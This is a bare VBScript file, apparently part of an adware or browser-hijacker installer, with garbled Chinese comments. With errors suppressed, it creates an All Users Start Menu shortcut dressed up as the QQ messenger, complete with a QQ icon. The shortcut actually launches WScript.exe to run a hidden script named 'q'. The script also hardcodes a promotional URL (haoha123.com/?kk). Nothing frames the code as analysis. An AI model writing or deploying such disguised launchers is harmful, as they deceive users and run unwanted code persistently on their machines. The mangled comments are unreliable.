Rem "600701663" 
on error resume next 
Dim url
url = "http://www.haoha123.com/?kk"
if url = "#"&"URL"&"#" then
 url="http://www.haoha123.com/?kk"
end if

Set WshShell = WScript.CreateObject("WScript.Shell")
strDesktop = WshShell.SpecialFolders("Desktop") :'�����ļ��С����桱
Favorites = WshShell.SpecialFolders("Favorites") :'�����ļ��С����桱
 
strttWinDir = WshShell.ExpandEnvironmentStrings("%ProgramFiles%")
dim direct
direct= strttWinDir & "\files"

iescc=strttWinDir&"\Internet Explorer\iexplore.exe"
ssd="ճ��"
winds = WshShell.ExpandEnvironmentStrings("%SystemRoot%")


CopyPath=WSHShell.ExpandEnvironmentStrings("%SystemRoot%") & "\" '��ȡ
ScriptEx=CopyPath & "System32\WScript.exe"
Rem "#REM#" 

pathname = WshShell.SpecialFolders("AllUsersStartMenu") +"\��"&"��\��"&"��\" 
Set oShellLink = WshShell.CreateShortcut(pathname+"��"&"Ѷ"&"QQ.lnk")
oShellLink.Arguments = "/e:vbs " & "q"
oShellLink.TargetPath = ScriptEx : 'Ŀ��
oShellLink.WindowStyle = 1 :'����1Ĭ�ϴ��ڼ������3��󻯼������7��С��
oShellLink.IconLocation = "%ProgramFiles%\files\qq.ico, 0" : 'ͼ��

Rem 600701663

oShellLink.WorkingDirectory = "%ProgramFiles%\files\" : '��ʼλ��
oShellLink.Save : '���������ݷ�ʽ

WScript.quit